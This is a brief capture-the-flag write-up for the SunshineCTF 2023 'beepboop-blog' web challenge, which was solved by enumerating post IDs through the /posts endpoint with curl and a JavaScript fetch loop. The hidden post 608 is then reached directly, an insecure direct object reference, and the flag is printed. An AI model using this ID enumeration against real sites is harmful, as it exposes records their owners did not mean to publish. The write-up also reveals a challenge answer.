# beepboop-blog

https://beepboop.web.2023.sunshinectf.games/post/1/

IDOR?

```sh
curl 'http://beepboop.web.2023.sunshinectf.games/posts/'
```

```js

/*
{
  "post": "Commonwealth was miracle\". although the two autonomous regions of. Atlanta journal-constitution speculation that some consider an employer's right and what would. Ransom. king columbus discovered the internal energy of a new canadian identity, marked by. Specialists generally the executive..",
  "post_url": "https://127.0.0.1:3000/post/90",
  "user": "Robot #911"
}
*/

// 1023 posts... missing 1?

fetch("/posts").then(data => {
    return data.json()
}).then(json => {
    console.log(json);
    const posts = json.posts;

    const postIds = [];

    for (let i = 0; i < posts.length; i++) {
        // if (posts[i].post.includes('sun{')) {
        //     console.log(posts[i]);
        // }
        const postUrl = posts[i]["post_url"].split("/");
        const postId = postUrl[postUrl.length - 1];
        postIds.push(postId);
    }

    console.log(postIds);
});

// looked through indices - 608?
```

https://beepboop.web.2023.sunshinectf.games/post/608/

`sun{wh00ps_4ll_IDOR}`
